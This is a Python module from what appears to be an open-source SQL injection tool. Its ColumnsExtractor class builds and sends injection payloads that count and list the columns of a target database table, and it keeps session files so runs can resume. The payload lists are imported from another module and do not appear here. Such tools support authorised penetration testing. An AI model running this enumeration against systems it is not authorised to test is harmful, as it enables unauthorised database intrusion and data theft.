#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from xpath.common.lib import (
    binascii,
    compat_urlencode,
    TBL_COLUMNS,
    COLS_STATEMENT,
    collections,
)
from xpath.common.session import session
from xpath.injector.request import request
from xpath.logger.colored_logger import logger
from xpath.common.payloads import PAYLOADS_COLS_COUNT, PAYLOADS_COLS_NAMES
from xpath.common.utils import prettifier, to_hex, prepare_payload_request, clean_up_offset_payload


class ColumnsExtractor:
    """
    Extracts columns for a table in database
    """

    def _generate_col_payloads(self, col_count, payload, index=0):
        payload = clean_up_offset_payload(payload)
        payloads = [payload.format(index=i) for i in range(index, col_count)]
        return payloads

    def _col_count(self, db="", tbl=""):
        _temp = []
        if db and tbl:
            count_payloads = []
            [count_payloads.extend(v) for _, v in PAYLOADS_COLS_COUNT.items()]
            encode_db = to_hex(db, dbms=self._dbms)
            encode_tbl = to_hex(tbl, dbms=self._dbms)
            if self._dbms:
                count_payloads = PAYLOADS_COLS_COUNT.get(self._dbms, count_payloads)
            for entry in count_payloads:
                data = entry.format(db=encode_db, tbl=encode_tbl)
                _temp.append(data)
        payloads = self._generat_payload(payloads_list=_temp)
        return self._extact(payloads=payloads)

    def col_names(self, db="", tbl=""):
        index = 0
        _temp = []
        is_resumed = False
        fetched_data = {}
        _temp_payloads = []
        ColumnsResponse = collections.namedtuple(
            "ColumnsResponse", ["fetched", "count", "database", "table", "columns"]
        )
        if db and tbl:
            dump_payloads = []
            [dump_payloads.extend(v) for _, v in PAYLOADS_COLS_NAMES.items()]
            encode_db = to_hex(db, dbms=self._dbms)
            encode_tbl = to_hex(tbl, dbms=self._dbms)
            if self._dbms:
                dump_payloads = PAYLOADS_COLS_NAMES.get(self._dbms, dump_payloads)
            for entry in dump_payloads:
                data = entry.format(db=encode_db, tbl=encode_tbl)
                _temp_payloads.append(data)
        try:
            fetched_data = session.fetch_from_table(
                session_filepath=self.session_filepath, table_name=tbl, cursor=False,
            )
            if fetched_data:
                is_resumed = True
        except Exception as error:
            pass
        logger.info("fetching columns for table '%s' in database: '%s'" % (tbl, db))
        retval = self._col_count(db=db, tbl=tbl)
        if retval.is_injected:
            col_count = int(retval.result)
            if col_count != 0:
                logger.info("used SQL query returns %d entries" % (col_count))
            if col_count == 0:
                logger.warning("used SQL query returns %d entries for table '%s' in database: '%s'" % (col_count, tbl, db))
                return ColumnsResponse(
                        fetched=False,
                        count=col_count,
                        database=db,
                        table=tbl,
                        columns=[],
                    )
            if is_resumed:
                for entry in fetched_data:
                    name = entry.get("colname")
                    if name not in _temp:
                        _temp.append(name)
                    logger.info(f"resumed: '{name}'")
                    index += 1
            should_fetch = True
            if is_resumed:
                if len(fetched_data) == col_count:
                    should_fetch = False
            if should_fetch:
                payloads = self._generat_payload(payloads_list=_temp_payloads)
                retval = self._extact(payloads=payloads)
                if retval.is_injected:
                    payload = retval.payload
                    payloads = self._generate_col_payloads(
                        col_count=col_count, payload=payload, index=index
                    )
                    if not is_resumed:
                        session.generate_table(
                            session_filepath=self.session_filepath,
                            query=TBL_COLUMNS.format(name=tbl, tbl_name=tbl),
                        )
                    response_data = self._extract_cols(
                        payloads=payloads, database=db, table=tbl
                    )
                    if response_data.is_fetched:
                        _temp.extend(response_data.result)
                    self._pprint_columns(
                        cursor_or_list=_temp, field_names="", database=db, table=tbl,
                    )
                    return ColumnsResponse(
                        fetched=True,
                        count=col_count,
                        database=db,
                        table=tbl,
                        columns=_temp,
                    )
                if not retval.is_injected:
                    status_code = retval.status_code
                    error = retval.error
                    count = retval.payloads_count
                    if status_code not in [200, 0]:
                        message = f"{error} - {count} times"
                        logger.warning(
                            f"HTTP error codes detected during run:\n{message}"
                        )
                    else:
                        message = f"tested with '{count}' queries, unable to find working SQL query."
                        logger.critical(message)
            else:
                self._pprint_columns(
                    cursor_or_list=_temp, field_names="", database=db, table=tbl,
                )
                return ColumnsResponse(
                    fetched=True,
                    count=col_count,
                    database=db,
                    table=tbl,
                    columns=_temp,
                )
        if not retval.is_injected:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                message = f"{error} - {count} times"
                logger.warning(f"HTTP error codes detected during run:\n{message}")
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return ColumnsResponse(
            fetched=False, count=0, database=db, table=tbl, columns=_temp,
        )

    def _pprint_columns(self, cursor_or_list, field_names, database="", table=""):
        obj = prettifier(cursor_or_list, field_names)
        data = obj.data
        entries = obj.entries
        logger.success(f"Database: {database}")
        logger.success(f"Table: {table}")
        logger.success(f"[{entries} columns]")
        logger.success(f"{data}")

    def _extract_cols(self, payloads, database="", table=""):
        _temp, index = [], 0
        Response = collections.namedtuple("Response", ["is_fetched", "result"])

        while index < len(payloads):
            payload = payloads[index]
            payload_request = prepare_payload_request(self, payload)
            url = payload_request.url
            data = payload_request.data
            regex = payload_request.regex
            headers = payload_request.headers
            try:
                response = request.inject_payload(
                    url=url, regex=regex, data=data, headers=headers, proxy=self._proxy
                )
            except KeyboardInterrupt:
                logger.warning(
                    "user aborted during enumeration. Xpath will display partial output"
                )
                break
            else:
                if response.ok:
                    result = response.result
                    logger.info("retrieved: '%s'" % (result))
                    _temp.append(result)
                    retval = session.dump(
                        session_filepath=self.session_filepath,
                        query=COLS_STATEMENT.format(tbl_name=table, colname=result),
                    )
                index += 1

        if _temp and len(_temp) > 0:
            _temp = list(set(_temp))
            resp = Response(is_fetched=True, result=_temp)
        else:
            resp = Response(is_fetched=False, result=_temp)
        return resp
